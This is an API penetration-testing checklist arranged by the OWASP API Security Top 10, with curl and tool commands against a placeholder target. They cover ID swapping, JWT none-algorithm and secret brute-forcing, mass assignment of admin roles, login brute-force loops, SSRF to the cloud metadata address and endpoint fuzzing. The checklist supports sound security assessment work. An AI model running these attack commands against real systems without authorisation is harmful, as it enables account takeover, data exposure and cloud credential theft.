# OWASP API Security Top 10 — VAPT Checklist
# Practical checklist with curl commands for each category

# ============================================================
# API1: BROKEN OBJECT LEVEL AUTHORIZATION (BOLA/IDOR)
# ============================================================

# [ ] Swap user IDs in path: /api/users/{id}/profile
curl -H "Authorization: Bearer <USER_A_TOKEN>" https://api.target.com/api/v1/users/USER_B_ID/profile

# [ ] Swap IDs in query parameters: ?user_id=OTHER
curl -H "Authorization: Bearer <TOKEN>" "https://api.target.com/api/orders?user_id=OTHER_USER_ID"

# [ ] Swap IDs in request body
curl -X PUT -H "Authorization: Bearer <TOKEN>" -H "Content-Type: application/json" \
  https://api.target.com/api/v1/users/OTHER_ID -d '{"name":"pwned"}'

# [ ] Test numeric ID increment/decrement
# [ ] Test UUID prediction (v1 UUIDs are time-based)
# [ ] Test base64-encoded ID manipulation
# [ ] Test GraphQL node ID tampering
# [ ] Remove Authorization header entirely
# [ ] Test unauthenticated access to all endpoints

# ============================================================
# API2: BROKEN AUTHENTICATION
# ============================================================

# [ ] Test JWT none algorithm
python -I jwt_attacks.py --token <jwt> --attack none

# [ ] Test JWT weak secret
python -I jwt_attacks.py --token <jwt> --attack bruteforce --wordlist jwt_common_secrets.txt

# [ ] Test JWT algorithm confusion (RS256 → HS256)
python -I jwt_attacks.py --token <jwt> --attack confusion --public-key pubkey.pem

# [ ] Test JWT claim tampering
python -I jwt_attacks.py --token <jwt> --attack tamper --claim role=admin

# [ ] Check for JWKS endpoint
curl https://api.target.com/.well-known/jwks.json

# [ ] Test expired token acceptance
# [ ] Test token reuse after logout
# [ ] Check if refresh tokens expire
# [ ] Test password reset flow for token reuse
# [ ] Test OTP brute-force (no rate limit?)
# [ ] Test default/weak credentials on admin endpoints
# [ ] Test API key in URL query parameter (logged in server logs)

# ============================================================
# API3: BROKEN OBJECT PROPERTY LEVEL AUTHORIZATION
# ============================================================

# [ ] Compare GET response fields vs POST/PUT accepted fields
# [ ] Add hidden fields to registration (role, is_admin, plan)
curl -X POST https://api.target.com/api/v1/register \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test123","role":"admin","is_admin":true}'

# [ ] Add hidden fields to profile update
curl -X PUT https://api.target.com/api/v1/users/me \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"name":"Test","role":"admin","verified":true}'

# [ ] Check API docs (Swagger) for internal-only fields
# [ ] Test mass assignment on every POST/PUT/PATCH endpoint
# [ ] Check if sensitive fields (password_hash, ssn) leak in responses

# ============================================================
# API4: UNRESTRICTED RESOURCE CONSUMPTION
# ============================================================

# [ ] Test rate limiting on login endpoint
for i in $(seq 1 200); do curl -s -o /dev/null -w "%{http_code}\n" \
  -X POST https://api.target.com/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"wrong"}'; done

# [ ] Test rate limit bypass with IP headers
# [ ] Test rate limit bypass with URL encoding
# [ ] Test GraphQL batching bypass
# [ ] Test pagination without limits (?limit=99999)
curl -H "Authorization: Bearer <TOKEN>" "https://api.target.com/api/v1/users?limit=99999"

# [ ] Test file upload size limits
# [ ] Test deeply nested JSON body
# [ ] Test regex DoS in search fields
# [ ] Check for rate limit headers (X-RateLimit-*)

# ============================================================
# API5: BROKEN FUNCTION LEVEL AUTHORIZATION
# ============================================================

# [ ] Access admin endpoints with regular user token
curl -H "Authorization: Bearer <USER_TOKEN>" https://api.target.com/api/v1/admin/users
curl -H "Authorization: Bearer <USER_TOKEN>" https://api.target.com/api/v1/admin/config

# [ ] Test HTTP method override
curl -X POST -H "X-HTTP-Method-Override: DELETE" -H "Authorization: Bearer <TOKEN>" \
  https://api.target.com/api/v1/users/123

# [ ] Replay admin requests with regular token (full Burp sitemap comparison)
# [ ] Test API version switching (v1 might be less restricted than v2)
# [ ] Test internal endpoint discovery (/api/internal/*, /api/debug/*)

# ============================================================
# API6: UNRESTRICTED ACCESS TO SENSITIVE BUSINESS FLOWS
# ============================================================

# [ ] Automate coupon/discount application
# [ ] Automate referral bonus collection
# [ ] Test purchase flow manipulation (price, quantity in request)
# [ ] Test inventory exhaustion (add 999999 to cart)
# [ ] Test review/rating manipulation
# [ ] Test automated content scraping (no bot detection)

# ============================================================
# API7: SERVER SIDE REQUEST FORGERY (SSRF)
# ============================================================

# [ ] Test webhook URL with internal addresses
curl -X POST https://api.target.com/api/v1/webhooks \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/","events":["*"]}'

# [ ] Test avatar/image URL fetching
# [ ] Test PDF/report generation with URL template
# [ ] Test import functionality with URL
# [ ] Test OAuth redirect_uri for SSRF
# [ ] Test cloud metadata access (169.254.169.254)
# [ ] Test file:// protocol
# [ ] Test DNS rebinding

# ============================================================
# API8: SECURITY MISCONFIGURATION
# ============================================================

# [ ] Check for exposed Swagger/OpenAPI docs
curl https://api.target.com/swagger.json
curl https://api.target.com/openapi.json
curl https://api.target.com/api-docs

# [ ] Check for verbose error messages (stack traces)
curl https://api.target.com/api/v1/users/invalid

# [ ] Check CORS configuration
curl -H "Origin: https://evil.com" -v https://api.target.com/api/v1/users

# [ ] Check unnecessary HTTP methods allowed
curl -X OPTIONS https://api.target.com/api/v1/users

# [ ] Check for debug endpoints
curl https://api.target.com/actuator/env
curl https://api.target.com/debug/vars
curl https://api.target.com/server-info

# [ ] Check TLS configuration
# [ ] Check security headers (HSTS, CSP, X-Content-Type-Options)
# [ ] Check for default credentials on admin panels

# ============================================================
# API9: IMPROPER INVENTORY MANAGEMENT
# ============================================================

# [ ] Discover old API versions
curl https://api.target.com/api/v1/users
curl https://api.target.com/api/v2/users
curl https://api.target.com/api/v3/users

# [ ] Check for shadow/undocumented endpoints (compare docs vs actual)
# [ ] Check for staging/test endpoints left in production
# [ ] Check for deprecated but still functional endpoints
# [ ] Fuzz for hidden endpoints
ffuf -u https://api.target.com/api/v1/FUZZ -w api_endpoints.txt -mc 200,301,302,403

# ============================================================
# API10: UNSAFE CONSUMPTION OF APIS
# ============================================================

# [ ] Test third-party API response injection
# [ ] Test webhook payload manipulation
# [ ] Check if API trusts third-party data without validation
# [ ] Test redirect chains through third-party services
# [ ] Check for SSRF via third-party URL processing

# ============================================================
# GRAPHQL SPECIFIC
# ============================================================

# [ ] Test introspection
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name kind}}}"}'

# [ ] Test query batching
# [ ] Test nested query DoS
# [ ] Test mutation-based injection
# [ ] Test field suggestion (typo disclosure)
# [ ] Test subscription authorization

# ============================================================
# TOOLS
# ============================================================

# Burp Suite — HTTP proxy, scanner, Intruder
# Postman — API collection testing
# ffuf — endpoint fuzzing
# Arjun — hidden parameter discovery
# jwt_tool — JWT manipulation
# InQL — GraphQL scanner (Burp)
# Kiterunner — API endpoint brute-force
# nuclei — template-based scanning
# SoapUI — SOAP API testing
# graphw00f — GraphQL fingerprinting
